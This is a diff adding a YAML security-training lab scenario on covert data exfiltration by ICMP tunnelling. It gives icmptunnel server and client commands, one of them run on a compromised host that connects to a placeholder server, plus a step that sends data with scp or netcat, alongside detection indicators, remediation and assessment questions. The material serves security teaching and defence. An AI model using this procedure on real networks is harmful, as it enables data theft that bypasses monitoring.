@@ -1,0 +1,93 @@
+# Category: Data Exfiltration
+name: "ICMP Tunneling – Covert Data Transfer via Ping Packets"
+id: "exfil-icmp-tunnel-001"
+category: "exfiltration"
+subcategory: "network_tunnels"
+difficulty: "intermediate"
+estimated_time: "50 minutes"
+
+description: |
+  Use ICMP echo requests (ping) to tunnel data out of a network. Since ICMP
+  is often allowed outbound, attackers can embed data in the payload of
+  ping packets to exfiltrate small amounts of data.
+
+learning_objectives:
+  - Understand ICMP packet structure
+  - Use tools like ptunnel or icmptunnel to create a tunnel
+  - Transmit data over ICMP
+  - Detect and defend against ICMP tunneling
+
+tools:
+  - icmptunnel
+  - ptunnel
+  - Python (scapy for custom implementation)
+
+prerequisites:
+  - Target host with outbound ICMP allowed
+  - A server that can receive ICMP replies
+
+steps:
+  - id: "step1"
+    phase: "server_setup"
+    action: "Run ICMP tunnel server"
+    commands:
+      - "# Install icmptunnel"
+      - "./icmptunnel -s"
+    expected_output: "Server listening for ICMP tunnel traffic"
+    detection: "Network devices may see large ICMP packets"
+
+  - id: "step2"
+    phase: "client_setup"
+    action: "Run client on compromised host"
+    commands:
+      - "./icmptunnel -c <SERVER_IP>"
+      - "# Then use the virtual interface for exfiltration"
+    expected_output: "ICMP tunnel established"
+    detection: "High ICMP traffic; large packet sizes"
+
+  - id: "step3"
+    phase: "exfil"
+    action: "Use tunnel to send data"
+    commands:
+      - "# Use scp or netcat over tunnel interface"
+    expected_output: "Data transferred"
+    detection: "Same"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1048"
+    description: "Exfiltration Over Alternative Protocol"
+  - standard: "NIST SP 800-53"
+    control: "SC-7"
+    description: "Boundary Protection"
+
+detection:
+  network_indicators:
+    - "ICMP packets with payload size > 64 bytes"
+    - "High frequency of ICMP echo requests"
+  log_indicators:
+    - "N/A"
+  endpoint_indicators:
+    - "icmptunnel processes"
+
+remediation:
+  immediate:
+    - "Limit ICMP packet size on firewalls"
+    - "Allow ICMP only for specific hosts"
+  long_term:
+    - "Inspect ICMP payloads for anomalies"
+    - "Implement rate limiting on ICMP"
+
+variables:
+  server_ip: "10.0.0.100"
+
+assessment_questions:
+  - "What fields in an ICMP packet can carry data?"
+  - "How can you detect ICMP tunneling?"
+  - "Why is ICMP often allowed outbound?"
+
+references:
+  - url: "https://github.com/DhavalKapil/icmptunnel"
+    title: "icmptunnel"
+  - url: "https://www.ietf.org/rfc/rfc792.txt"
+    title: "ICMP RFC"
